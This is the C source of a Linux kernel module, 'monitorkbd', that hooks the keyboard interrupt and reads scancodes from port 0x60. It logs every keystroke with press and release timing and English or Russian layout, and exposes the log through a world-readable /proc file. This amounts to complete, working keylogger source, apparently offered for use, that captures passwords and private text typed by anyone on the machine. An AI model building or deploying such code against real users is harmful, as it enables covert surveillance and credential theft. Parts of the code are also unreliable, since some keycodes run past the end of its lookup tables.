#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/slab.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/time.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/fs_struct.h>
#include <linux/uaccess.h>
#include <linux/input.h>

#define KEYSTORE_ITEMS_MAX 128
#define KEYSTORE_ITEM_MAX_SIZE 80
#define SUCCESS 0

#define DRIVER_VERSION "v1.0"
#define DRIVER_AUTHOR "Savital"
#define DRIVER_DESC "Loadable kernel module for monitoring users' keyboard activity"
#define DRIVER_NAME "monitorkbd"

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");
MODULE_SUPPORTED_DEVICE("Standard 101/102-Key PS/2 Keyboard for HP Hotkey Support");

static const char *PROC_FILENAME = "stat";
static const char *PROC_DIRNAME = DRIVER_NAME;

typedef struct
{
    struct work_struct keywork;
    int keycode;
    unsigned long long time_stamp;
} keywork_t;

static irqreturn_t irq_handler(int irq, void *dev_id);
static void workqueue_function(struct work_struct* keywork);

keywork_t *keywork;

static struct workqueue_struct *queue = NULL;

struct proc_dir_entry *proc_dir;
struct proc_dir_entry *proc_file;

char *msg;

static int isCapsLock = 0;
static size_t isRU = 0;

static unsigned int id = 0;
static unsigned char keycode = 0;
static unsigned char status = 0;

static unsigned long long released_stamp = 0;

static int result = 0;
static int ret = 0;
static int i = 0;

char* lowerKbdus[128] =
{
    "UK", "Escape", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "Backspace", "Tab", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "Enter", "Control",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "\'", "`",   "LeftShift",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",   "RightShift", "PrintScreen", "Alt", "SpaceBar",
    "CapsLock", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
    "NumLock", "ScrollLock", "HomeKey", "UpArrow", "PageUp", "-", "LeftArrow",
    "UK", "RightArrow", "+", "EndKey", "DownArrow", "PageDown", "InsertKey", "DeleteKey",
    "UK", "UK", "UK", "F11", "F12",
    "UK", "UK", "WinKey", "UK", "UK", "UK", "UK", "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "UK",
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
    "<PageDown>", "<Insert>", "<Delete>"	/* All other keys are undefined */
};

char* upperKbdus[128] =
{
    "UK", "Escape", "!", "@", "#", "$", "%", "^", "&", "&", "(", ")", "_", "+",
    "Backspace", "Tab", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "Enter", "Control",
    "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "\"", "~", "LeftShift",
    "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?", "RightShift", "PrintScreen", "Alt", "SpaceBar",
    "CapsLock", "F1", "F2",   "F3",   "F4",   "F5",   "F6",   "F7",   "F8",   "F9", "F10",
    "NumLock", "ScrollLock", "HomeKey", "UpArrow", "PageUp", "-", "LeftArrow",
    "UK", "RightArrow", "+", "EndKey", "DownArrow", "PageDown", "InsertKey", "DeleteKey",
    "UK",   "UK",   "UK", "F11", "F12",
    0, 0, "WinKey"	/* All other keys are undefined */
};

char* lowerKbdusRU[128] =
{
    "UK", "Escape", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "Backspace", "Tab", "й", "ц", "у", "к", "е", "н", "г", "ш", "щ", "з", "х", "ъ", "Enter", "Control",
    "ф", "ы", "в", "а", "п", "р", "о", "л", "д", "ж", "э", "ё",   "LeftShift",
    "\\", "я", "ч", "с", "м", "и", "т", "ь", "б", "ю", ".",   "RightShift", "PrintScreen", "Alt", "SpaceBar",
    "CapsLock", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
    "NumLock", "ScrollLock", "HomeKey", "UpArrow", "PageUp", "-", "LeftArrow",
    "UK", "RightArrow", "+", "EndKey", "DownArrow", "PageDown", "InsertKey", "DeleteKey",
    "UK",   "UK",   "UK", "F11",	"F12",
    0, 0, "WinKey"	/* All other keys are undefined */
};

char* upperKbdusRU[128] =
{
    "UK", "Escape", "!", "@", "#", "$", "%", "^", "&", "&", "(", ")", "_", "+",
    "Backspace", "Tab", "Й", "Ц", "У", "К", "Е", "Н", "Г", "Ш", "Щ", "З", "Х", "Ъ", "Enter", "Control",
    "Ф", "Ы", "В", "А", "П", "Р", "О", "Л", "Д", "Ж", "Э", "Ё", "LeftShift",
    "|", "Я", "Ч", "С", "М", "И", "Т", "Ь", "Б", "Ю", ",", "RightShift", "PrintScreen", "Alt", "SpaceBar",
    "CapsLock", "F1", "F2",   "F3",   "F4",   "F5",   "F6",   "F7",   "F8",   "F9", "F10",
    "NumLock", "ScrollLock", "HomeKey", "UpArrow", "PageUp", "-", "LeftArrow",
    "UK", "RightArrow", "+", "EndKey", "DownArrow", "PageDown", "InsertKey", "DeleteKey",
    "UK",   "UK",   "UK", "F11", "F12",
    0, 0, "WinKey"	/* All other keys are undefined */
};

unsigned long mtime(void)
{
	struct timespec t;
	getnstimeofday(&t);
	return ((unsigned long) (t.tv_sec * 1000) + (unsigned long) (t.tv_nsec / 1000000));
}

struct keystore_item 
{
    unsigned int id;
	int state;
	int layout;
	int keycode;
	unsigned long long downtime;
	unsigned long long searchtime;
	struct keystore_item *next;
} *keystore;

void init_keystore(struct keystore_item* keystore)
{
    for (i = 0; i < KEYSTORE_ITEMS_MAX; i++)
	{
	    keystore[i].id = 0;
	    keystore[i].state = -1;
	    keystore[i].layout = -1;
		keystore[i].keycode = -1;
		keystore[i].downtime = 0;
		keystore[i].searchtime = 0;
		keystore[i].next = NULL;
	}
}

struct log_queue 
{
	struct keystore_item *frnt, *rear;
} *log_queue_table;

void init_queue(struct log_queue *q) 
{
	q->frnt = NULL;
	q->rear = NULL;
}

int queue_isempty(struct log_queue *q) 
{
	if (q->frnt == NULL) 
	{
		q->rear = NULL;
		return 1;
	}  
	else 
		return 0;
}

void insert_in_queue(struct log_queue *q, int id, int state, int layout, int keycode, unsigned long time, unsigned long time_up)
{
	if((q->rear == NULL) && (q->frnt == NULL)) 
	{
    	q->rear = kmalloc(sizeof(struct keystore_item), GFP_ATOMIC);
    	q->rear->id = id;
		q->rear->state = state;
		q->rear->layout = layout;
		q->rear->keycode = keycode;
		q->rear->downtime = time;
		q->rear->searchtime = time_up;
		q->rear->next = NULL;
    	q->frnt = q->rear;
  	} 
	else 
	{
		struct keystore_item* temp = kmalloc(sizeof(struct keystore_item), GFP_ATOMIC);
		q->rear->next = temp;
    	temp->id = id;
    	temp->state = state;
    	temp->layout = layout;
    	temp->keycode = keycode;
		temp->downtime = time;
		temp->searchtime = time_up;
		temp->next = NULL;
		q->rear = temp;
	}
}

struct keystore_item remove_from_queue(struct log_queue *q) 
{
	struct keystore_item ret;
	struct keystore_item *temp;
	ret.id = 0;
	ret.state = -1;
	ret.layout = -1;
	ret.keycode = -1;
	ret.downtime = 0;
	ret.searchtime = 0;

	if (queue_isempty(q)) 
	{
		return ret;
	}
	ret.id = q->frnt->id;
	ret.state = q->frnt->state;
	ret.layout = q->frnt->layout;
	ret.keycode = q->frnt->keycode;
	ret.downtime = q->frnt->downtime;
	ret.searchtime = q->frnt->searchtime;

	temp = q->frnt;
	q->frnt = q->frnt->next;

	kfree(temp);

	return ret;
}

static void workqueue_function(struct work_struct* work) // 0x3A TODO
{
    keywork = (keywork_t *) work;
    keycode = keywork->keycode;

	if (keycode & 0x80) // if released
	{
		keycode &= 0x7F;

		if (keycode >= 96) // TODO
	    {
	        kfree((void*)work);
	        return;
	    }

        if ((keystore[0x5B].keycode == 0x5B) && (keystore[0x39].keycode == 0x39))
        {
            if (isRU)
                isRU = 0;
            else
                isRU = 1;
        }

		released_stamp = keywork->time_stamp ? keywork->time_stamp : 1;

        keystore[keycode].state = 2;
	    insert_in_queue(log_queue_table, keystore[keycode].id, keystore[keycode].state, keystore[keycode].layout, keystore[keycode].keycode, keywork->time_stamp - keystore[keycode].downtime, keystore[keycode].searchtime);

		keystore[keycode].keycode = -1;
	}
	else // if pressed
	{
	    if (keycode >= 96) // TODO
	    {
	        kfree((void*)work);
	        return;
	    }

        if (keystore[keycode].keycode == -1) // key down event
        {
            keystore[keycode].downtime = keywork->time_stamp;
            keystore[keycode].searchtime = keywork->time_stamp - released_stamp;

            keystore[keycode].id = ++id;
            keystore[keycode].state = 0;

            if (keycode == 0x3A) // TODO
            {
                if (isCapsLock)
                    isCapsLock = 0;
                else
                    isCapsLock = 1;
            }
            keystore[keycode].layout = (((keystore[0x2A].keycode == 0x2A || keystore[0x36].keycode == 0x36) ? 1 : 0) + isCapsLock) % 2;
            if (isRU) // TODO
                keystore[keycode].layout += 2;

            keystore[keycode].keycode = keycode;
        }
        else // key pressed event
            keystore[keycode].state = 1;

		insert_in_queue(log_queue_table, keystore[keycode].id, keystore[keycode].state, keystore[keycode].layout, keystore[keycode].keycode, keywork->time_stamp - keystore[keycode].downtime, keystore[keycode].searchtime);
	}

	kfree((void*)work);
}

static irqreturn_t irq_handler(int irq, void *dev_id)
{
    keycode = inb(0x60);
	status = inb(0x64);

	keywork = (keywork_t*)kmalloc(sizeof(keywork_t), GFP_KERNEL);
    if (keywork)
	{
        INIT_WORK((struct work_struct *) keywork, workqueue_function);
        keywork->keycode = keycode;
        keywork->time_stamp = mtime();
		ret = queue_work(queue, (struct work_struct *) keywork);
    }
	else
	{
		printk(KERN_ERR "monitorkbd error: Could not allocate memory for work.\n");
	}

	return IRQ_HANDLED;
}

static int procfile_open(struct inode *i, struct file *f) 
{
	return SUCCESS;
}

static ssize_t procfile_read(struct file *filp, char *buffer, size_t count, loff_t *offp) 
{	
	struct keystore_item temp;
	int len;
	char* mychar;

	len = 0;
	if (queue_isempty(log_queue_table)) 
		return len;

	temp = remove_from_queue(log_queue_table);

	mychar = "UK"; // TODO
	if (temp.layout == 0)
	    mychar = lowerKbdus[temp.keycode];
	if (temp.layout == 1)
	    mychar = upperKbdus[temp.keycode];
	if (temp.layout == 2)
	    mychar = lowerKbdusRU[temp.keycode];
	if (temp.layout == 3)
	    mychar = upperKbdusRU[temp.keycode];

	len += sprintf(msg, "%d %d %d %d %llu %llu %s\n", temp.id, temp.state, temp.layout, temp.keycode, temp.downtime, temp.searchtime, mychar);

	copy_to_user(buffer, msg, len);

	return len;
}

const struct file_operations proc_file_fops = 
{
	.open = procfile_open,
	.read = procfile_read,
};

static int monitorkbd_init(void)
{
	if (!(msg = kmalloc(KEYSTORE_ITEM_MAX_SIZE * sizeof(char), GFP_ATOMIC)))
	{
	    return -ENOMEM;
	}

	if (!(keystore = kmalloc(KEYSTORE_ITEMS_MAX * sizeof(struct keystore_item), GFP_ATOMIC)))
	{
	    kfree(msg);
	    return -ENOMEM;
	}

	if (!(log_queue_table = kmalloc(sizeof(struct log_queue), GFP_ATOMIC)))
	{
	    kfree(keystore);
	    kfree(msg);
	    return -ENOMEM;
	}

	init_queue(log_queue_table);
    init_keystore(keystore);

	 if (!(proc_dir = proc_mkdir(PROC_DIRNAME, NULL)))
	 {
        kfree(log_queue_table);
	    kfree(keystore);
	    kfree(msg);
        remove_proc_entry(PROC_DIRNAME, NULL);
        printk(KERN_ERR "%s error: Can't create proc directory.\n", DRIVER_NAME);
        return -ENOMEM;
    }

	if (!(proc_file = proc_create(PROC_FILENAME, 0644, proc_dir, &proc_file_fops)))
	{
        kfree(log_queue_table);
	    kfree(keystore);
	    kfree(msg);
		remove_proc_entry(PROC_DIRNAME, NULL);
		remove_proc_entry(PROC_FILENAME, NULL);
		printk(KERN_ERR "%s error: Can't create proc file.\n", DRIVER_NAME);
		return -ENOMEM;
	}

	result = request_irq(1, (irq_handler_t) irq_handler, IRQF_SHARED, "monitorkbd_rirq", (void*)(irq_handler));
	if (!result) 
	{
		queue = alloc_workqueue("monitorkbd_wq", WQ_MEM_RECLAIM | WQ_HIGHPRI, 0);
		if (!queue) 
		{
			free_irq(1, (void*) irq_handler);
			printk(KERN_ERR "%s error: Could not allocate memory for queue.\n", DRIVER_NAME);

			return -ENOMEM;
		}
	}	
	printk(KERN_INFO "%s info: successfully loaded!", DRIVER_NAME);

	return 0;
}

static void monitorkbd_exit(void)
{
    remove_proc_entry(PROC_DIRNAME, NULL);
	remove_proc_entry(PROC_FILENAME, NULL);
	
	flush_workqueue(queue);
	destroy_workqueue(queue);
	free_irq(1, (void*)irq_handler);

	kfree(log_queue_table);
	kfree(keystore);	
	kfree(msg);

	printk(KERN_INFO "%s info: successfully unloaded!", DRIVER_NAME);
}

module_init(monitorkbd_init);
module_exit(monitorkbd_exit);

